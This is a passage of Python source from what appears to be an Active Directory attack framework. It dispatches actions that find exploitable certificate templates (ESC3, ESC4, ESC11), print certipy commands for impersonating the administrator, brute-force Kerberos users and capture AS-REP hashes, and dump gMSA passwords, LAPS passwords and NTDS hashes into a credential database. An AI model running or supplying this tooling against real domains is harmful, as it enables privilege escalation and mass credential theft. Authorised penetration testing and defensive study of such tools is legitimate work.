                            Output.write({'target': ldapscan.url(), 'message': "- %s   (Enabled)\n\tCA:                         %s\n\tEKU:                        %s\n\tEnrollment rights:          (%s) %s" % (entry['name'].ljust(30), enrollment_service, ','.join(entry['eku']), status, name)})

                            impersonate = "administrator"

                            if username == creds['username']:
                                account = "%s/%s" % (domain, username)
                                if 'password' in creds:
                                    account += ":%s@%s" % (creds['password'], target['hostname'])
                                elif 'hash' in creds:
                                    account += "@%s -hashes %s" % (target['hostname'], creds['hash'])
                                else:
                                    account += ":%s@%s" % ('<password>', target['hostname'])
                            else:
                                password = "<password>"
                                account = "%s/%s:%s@%s" % (domain, username, password, target['hostname'])

                            ca = enrollment_service

                            request_cert1 = "certipy req '%s' -ca '%s' -template '%s'" % (account, ca, entry['name']) 
                            request_cert3 = "certipy req '%s' -ca '%s' -template 'User' -on-behalf-of '%s' -pfx '%s.pfx'" % (account, ca, impersonate, username) 
                            request_tgt = "certipy auth -pfx %s.pfx" % impersonate
                            Output.vuln({'target': ldapscan.url(), 'message': "To exploit, run these commands (It will be exploitable only if Enrollment agent restrictions are not implemented on the CA) :\n%s\n%s\n%s" % (request_cert1, request_cert3, request_tgt)})
                        else:
                            Output.minor({'target': ldapscan.url(), 'message': "- %s   (Disabled)\n\tCA:                         %s\n\tEKU:                        %s\n\tEnrollment rights:          (%s) %s" % (entry['name'].ljust(30), enrollment_service, ','.join(entry['eku']), status, name)})

                       
                    Output.highlight({'target': ldapscan.url(), 'message': 'Misconfigured certificates templates (ESC3) exploitable by user %s:' % username})
                    ldapscan.check_esc3(username, callback)


            if 'esc4' in actions:

                if len(actions['esc4']['user']) == 0:
                    #domain = creds['domain']
                    username = creds['username']
                elif not '\\' in actions['esc4']['user']:
                    #domain = creds['domain']
                    username = actions['esc4']['user']
                else:
                    #domain = actions['esc4']['user'].split('\\')[0]
                    username = actions['esc4']['user'].split('\\')[-1]

                if ldap_authenticated:
                    enrollment_services = []
                    def callback(entry):
                        enrollment_services.append(entry)
                        Output.write({'target': ldapscan.url(), 'message': "- %s   %s" % (entry['name'].ljust(30), entry['dns'])})

                    Output.highlight({'target': ldapscan.url(), 'message': 'Enrollment Services:'})
                    ldapscan.list_enrollment_services(callback)

                    def callback(entry):
                        enabled = False
                        enrollment_service = None
                        for e_s in enrollment_services:
                            if entry['name'] in e_s['templates']:
                                enabled = True
                                enrollment_service = e_s['name']
                                break

                        if not "WriteDACL" in entry['ace']['rights'] and not 'WriteOwner' in entry['ace']['rights'] and not 'GenericAll' in entry['ace']['rights'] and not 'GenericWrite' in entry['ace']['rights']:
                            return

                        priv_account = entry['ace']['name'] if 'name' in entry['ace'] else entry['ace']['sid']
                        status = entry['ace']['type']

                        if enabled:
                            Output.write({'target': ldapscan.url(), 'message': "- %s   (Enabled)\n\tCA:                         %s\n\tPrivilege:          (%s)  [%s]  %s" % (entry['name'].ljust(30), enrollment_service, status, ','.join(entry['ace']['rights']), priv_account)})
                        else:
                            Output.minor({'target': ldapscan.url(), 'message': "- %s   (Disabled)\n\tCA:                         %s\n\tPrivilege:          (%s)  [%s]  %s" % (entry['name'].ljust(30), enrollment_service, status, ','.join(entry['ace']['rights']), priv_account)})

                    Output.highlight({'target': ldapscan.url(), 'message': 'Misconfigured certificates templates (ESC4) exploitable by user %s:' % username})
                    ldapscan.check_esc4(username, callback)

            if 'esc11' in actions:

                if len(actions['esc11']['user']) == 0:
                    #domain = creds['domain']
                    username = creds['username']
                elif not '\\' in actions['esc11']['user']:
                    #domain = creds['domain']
                    username = actions['esc11']['user']
                else:
                    #domain = actions['esc11']['user'].split('\\')[0]
                    username = actions['esc11']['user'].split('\\')[-1]

                if ldap_authenticated:
                    enrollment_services = []
                    def callback(entry):
                        enrollment_services.append(entry)
                        Output.write({'target': ldapscan.url(), 'message': "- %s   %s" % (entry['name'].ljust(30), entry['dns'])})

                    Output.highlight({'target': ldapscan.url(), 'message': 'Enrollment Services:'})
                    ldapscan.list_enrollment_services(callback)

                    def callback(entry):
                        enabled = False
                        enrollment_service = None
                        for e_s in enrollment_services:
                            if entry['name'] in e_s['templates']:
                                enabled = True
                                enrollment_service = e_s['name']
                                break

                        if not "WriteDACL" in entry['ace']['rights'] and not 'WriteOwner' in entry['ace']['rights'] and not 'GenericAll' in entry['ace']['rights'] and not 'GenericWrite' in entry['ace']['rights']:
                            return

                        priv_account = entry['ace']['name'] if 'name' in entry['ace'] else entry['ace']['sid']
                        status = entry['ace']['type']

                        if enabled:
                            Output.write({'target': ldapscan.url(), 'message': "- %s   (Enabled)\n\tCA:                         %s\n\tPrivilege:          (%s)  [%s]  %s" % (entry['name'].ljust(30), enrollment_service, status, ','.join(entry['ace']['rights']), priv_account)})
                        else:
                            Output.minor({'target': ldapscan.url(), 'message': "- %s   (Disabled)\n\tCA:                         %s\n\tPrivilege:          (%s)  [%s]  %s" % (entry['name'].ljust(30), enrollment_service, status, ','.join(entry['ace']['rights']), priv_account)})

                    Output.highlight({'target': ldapscan.url(), 'message': 'Misconfigured certificates templates (ESC4) exploitable by user %s:' % username})
                    ldapscan.check_esc11(username, callback)



            if 'vuln_gpos' in actions:
                Output.highlight({'target': ldapscan.url(), 'message': 'Vulnerable GPOs:'})
                if smb_authenticated and ldap_authenticated:
                    def callback(entry):
                        Output.write({'target': ldapscan.url(), 'message': '- %s   %s' % (entry['name'].ljust(40), entry['path'])})
                    ldapscan.list_writable_GPOs(smbscan, callback)

            if 'acls' in actions:

                if len(actions['acls']['user']) == 0:
                    #domain = creds['domain']
                    username = creds['username']
                elif not '\\' in actions['acls']['user']:
                    #domain = creds['domain']
                    username = actions['acls']['user']
                else:
                    #domain = actions['acls']['user'].split('\\')[0]
                    username = actions['acls']['user'].split('\\')[-1]

                if 'all' in actions['acls']:
                    all = True
                else:
                    all = False

                Output.highlight({'target': ldapscan.url(), 'message': 'ACLs of the user %s:' % username})
                if ldap_authenticated:
                    def callback(entry):
                        if len(entry['rights']) > 0:
                            if 'parameter' in entry:
                                parameter = entry['parameter'] if 'parameter' in entry else entry['guid']
                                Output.write({'target': ldapscan.url(), 'message': '- (%s) %s ->   %s   [%s] %s:%s' % (entry['type'], entry['name'].ljust(30), entry['target'].ljust(30), ','.join(entry['rights']), parameter['type'], parameter['name'])})
                            elif 'guid' in entry:
                                Output.write({'target': ldapscan.url(), 'message': '- (%s) %s ->   %s   [%s] guid:%s' % (entry['type'], entry['name'].ljust(30), entry['target'].ljust(30), ','.join(entry['rights']), entry['guid'])})
                            else:
                                Output.write({'target': ldapscan.url(), 'message': '- (%s) %s ->   %s   [%s]' % (entry['type'], entry['name'].ljust(30), entry['target'].ljust(30), ','.join(entry['rights']))})


                    ldapscan.list_acls(username, callback, all=all)

            if 'constrained_delegation' in actions:
                Output.highlight({'target': ldapscan.url(), 'message': 'Constrained delegation (S4U2Proxy):'})
                if ldap_authenticated:
                    def callback(entry):
                        account = '%s\\%s' % (entry['domain'], entry['name'])
                        Output.write({'target': ldapscan.url(), 'message': '- %s  -> %s' % (account.ljust(40), entry['spn'])})
                    ldapscan.list_constrained_delegations(callback)

            if 'list_groups' in actions:

                if len(actions['list_groups']['user']) == 0:
                    #domain = creds['domain']
                    username = creds['username']
                elif not '\\' in actions['list_groups']['user']:
                    #domain = creds['domain']
                    username = actions['list_groups']['user']
                else:
                    #domain = actions['list_groups']['user'].split('\\')[0]
                    username = actions['list_groups']['user'].split('\\')[-1]

                for user in username.split(','):
                    Output.highlight({'target': ldapscan.url(), 'message': 'Account %s groups:' % user})
                    if ldap_authenticated:
                        def callback(entry):
                            Output.write({'target': ldapscan.url(), 'message': '- %s' % (entry,)})

                        ldapscan.list_user_groups(user, callback)

            if 'list_users' in actions:

                if len(actions['list_users']['group']) == 0:
                    Output.error({'target': ldapscan.url(), 'message': "--list-users requires a group name"})
                else:
                    if not '\\' in actions['list_users']['group']:
                        #domain = creds['domain']
                        groupname = actions['list_users']['group']
                    else:
                        #domain = actions['list_users']['group'].split('\\')[0]
                        groupname = actions['list_users']['group'].split('\\')[-1]

                    Output.highlight({'target': ldapscan.url(), 'message': 'Group %s users:' % groupname})
                    if ldap_authenticated:
                        def callback(entry):
                            user = '%s\\%s' % (entry['domain'], entry['username'])
                            Output.write({'target': ldapscan.url(), 'message': '- %s   %s  [%s]' % (user.ljust(30), entry['fullname'].ljust(30), ",".join(entry['tags']))})

                        ldapscan.list_group_users(groupname, callback)

            if 'object_acl' in actions:

                if 'all' in actions['object_acl']:
                    all = True
                else:
                    all = False

                Output.highlight({'target': ldapscan.url(), 'message': 'ACL of the object %s:' % actions['object_acl']['object']})
                if ldap_authenticated:
                    def callback(entry):
                        if len(entry['rights']) > 0:
                            if 'parameter' in entry:
                                parameter = entry['parameter'] if 'parameter' in entry else entry['guid']
                                Output.write({'target': ldapscan.url(), 'message': '- (%s) %s ->   %s   [%s] %s:%s' % (entry['type'], entry['name'].ljust(30), entry['target'].ljust(30), ','.join(entry['rights']), parameter['type'], parameter['name'])})
                            elif 'guid' in entry:
                                Output.write({'target': ldapscan.url(), 'message': '- (%s) %s ->   %s   [%s] guid:%s' % (entry['type'], entry['name'].ljust(30), entry['target'].ljust(30), ','.join(entry['rights']), entry['guid'])})
                            else:
                                Output.write({'target': ldapscan.url(), 'message': '- (%s) %s ->   %s   [%s]' % (entry['type'], entry['name'].ljust(30), entry['target'].ljust(30), ','.join(entry['rights']))})


                    ldapscan.list_object_acl(actions['object_acl']['object'], callback, all=all)

            if 'gettgt' in actions:
                Output.highlight({'target': smbscan.url(), 'message': 'Dumping the TGT of the current user...'})
                smbscan.gettgt()

            if 'gettgs' in actions:
                spn = actions['gettgs']['spn']
                if 'impersonate' in actions['gettgs']:
                    impersonate = actions['gettgs']['impersonate']
                else:
                    impersonate = None
                Output.highlight({'target': smbscan.url(), 'message': 'Dumping the TGS of the SPN %s...' % spn})
                smbscan.gettgs(spn, impersonate)

            if 'users_brute' in actions:
                # Technically only needs kerberos but well....
                if smb_available:
                    try:
                        if not 'domain' in creds or not '.' in creds['domain']:
                            Output.highlight({'target': smbscan.url(), 'message': 'Users bruteforce: Please provide complete domain fqdn'})
                        else:
                            kerberos = Kerberos(target['hostname'], creds['domain'])
                            Output.highlight({'target': smbscan.url(), 'message': 'Valid users:'})

                            # if no file is specified, dump a list of users through ldap
                            gen = kerberos.check_users_dump_asreq(ldapscan, username_file=actions['users_brute']['username_file'])
                            for valid_user in gen:
                                user = '%s\\%s' % (valid_user['domain'], valid_user['username'])
                                if 'asreq' in valid_user:
                                    Output.vuln({'target': smbscan.url(), 'message': '- %s  (Kerberos pre-auth disabled !!!)\n%s' % (user.ljust(50), valid_user['asreq'])})

                                    # insert domain vulnerability
                                    DB.insert_domain_vulnerability({
                                        'hostname': target['hostname'],
                                        'domain': valid_user['domain'],
                                        'name': 'Kerberos pre-auth disabled',
                                        'description': 'Kerberos pre-auth is disabled for user %s\\%s' % (valid_user['domain'], valid_user['username']),
                                    })

                                    cred_info = {
                                        'domain': valid_user['domain'],
                                        'username': valid_user['username'],
                                        'type': 'hash',
                                        'format': 'krb5asrep',
                                        'hash': valid_user['asreq'],
                                    }
                                    DB.insert_domain_credential(cred_info)


                                else:
                                    Output.write({'target': smbscan.url(), 'message': '- %s' % user})

                                    DB.insert_domain_user({
                                        'domain': valid_user['domain'],
                                        'username': valid_user['username'],
                                    })


                    except Exception as e:
                        raise e
            if 'dump_gmsa' in actions:
                if ldap_authenticated:
                    if ldapscan.ssl:
                        Output.highlight({'target': smbscan.url(), 'message': 'gMSA entries:'})
                        def callback(entry):
                            user = '%s\\%s' % (entry['domain'], entry['username'])
                            Output.write({'target': ldapscan.url(), 'message': '- %s   %s' % (user.ljust(40), entry['password'])})

                            cred_info = {
                                'domain': entry['domain'],
                                'username': entry['username'],
                                'type': 'password',
                                'password': entry['password'],
                            }
                            DB.insert_domain_credential(cred_info)
                        ldapscan.dump_gMSA(callback)
                    else:
                        Output.error({'target': ldapscan.url(), 'message': '--gmsa requires to connect to LDAP using SSL, it is probably not available here :('})
            if 'dump_laps' in actions:
                if ldap_authenticated:
                    Output.highlight({'target': smbscan.url(), 'message': 'LAPS entries:'})
                    def callback(entry):
                        user = '%s\\%s' % (entry['domain'], entry['username'])
                        if 'password' in entry:
                            Output.write({'target': ldapscan.url(), 'message': '- %s   %s   %s' % (user.ljust(40), entry['dns'].ljust(40), entry['password'])})

                            cred_info = {
                                'domain': entry['domain'],
                                'username': entry['username'],
                                'type': 'password',
                                'password': entry['password'],
                            }
                            DB.insert_domain_credential(cred_info)
                        else:
                            Output.write({'target': ldapscan.url(), 'message': '- %s   %s   Unable to retreive password, unsufficient rights' % (user.ljust(40), entry['dns'].ljust(40))})
                    ldapscan.dump_LAPS(callback)
            if 'dump_ntds' in actions:
                if smb_authenticated:
                    try:
                        Output.highlight({'target': smbscan.url(), 'message': 'Dumping NTDS (method: %s):' % actions['dump_ntds']['method']})
                        def ntds_hash(entry):
                            user = '%s\\%s' % (entry['domain'], entry['username'])
                            Output.write({'target': smbscan.url(), 'message': '- %s   %s   (%s)' % (user.ljust(40), entry['hash'].ljust(70), entry['hash_type'])})

                            cred_info = {
                                'domain': entry['domain'],
                                'username': entry['username'],
                                'type': 'hash',
                                'format': entry['hash_type'],
                                'hash': entry['hash'],
                            }
                            DB.insert_domain_credential(cred_info)

                        dumped = smbscan.dump_ntds(actions['dump_ntds']['method'], callback_func=ntds_hash)
                        Output.write({'target': smbscan.url(), 'message': 'Dumped %d hashes' % dumped})
                    except Exception as e:
                        raise e
                    except impacket.dcerpc.v5.rpcrt.DCERPCException as e:
                        if 'access_denied' in str(e):
                            Output.write({'target': smbscan.url(), 'message': 'Enum password policy: Access denied'})
                        else:
                            raise e

            if 'modules' in actions:
                if smb_available:
                    ad_modules.execute_modules(actions['modules']['modules'], (target, creds, actions['modules']['args'], timeout))

        else:
            Output.write({'target': smbscan.url(), 'message': 'LDAP: Unable to connect to both ldap and smb services'})


    except Exception as e:
        Output.write({'target': smbscan.url(), 'message': '%s: %s\n%s' % (type(e), e, traceback.format_exc())})
    finally:
        smbscan.disconnect()

